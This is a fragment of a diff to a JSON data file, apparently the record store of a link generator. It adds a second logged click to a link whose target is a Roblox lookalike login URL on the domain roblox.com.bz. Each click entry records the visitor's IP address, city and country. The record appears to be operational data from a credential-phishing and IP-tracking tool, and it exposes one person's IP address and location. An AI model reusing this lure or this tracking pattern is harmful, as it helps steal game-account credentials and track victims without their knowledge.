@@ -14900,11 +14900,19 @@
     "targetUrl": "https://roblox.com.bz/login?returnUrl=7790244825323055",
     "createdAt": 1782055128413,
     "status": "active",
-    "useCount": 1,
+    "useCount": 2,
     "createdBy": "generator",
     "clicks": [
       {
         "timestamp": 1782055134779,
+        "ip": "101.128.101.6",
+        "country": "Indonesia",
+        "city": "Bandung",
+        "flag": "🇮🇩",
+        "countryCode": "ID"
+      },
+      {
+        "timestamp": 1782055207867,
         "ip": "101.128.101.6",
         "country": "Indonesia",
         "city": "Bandung",
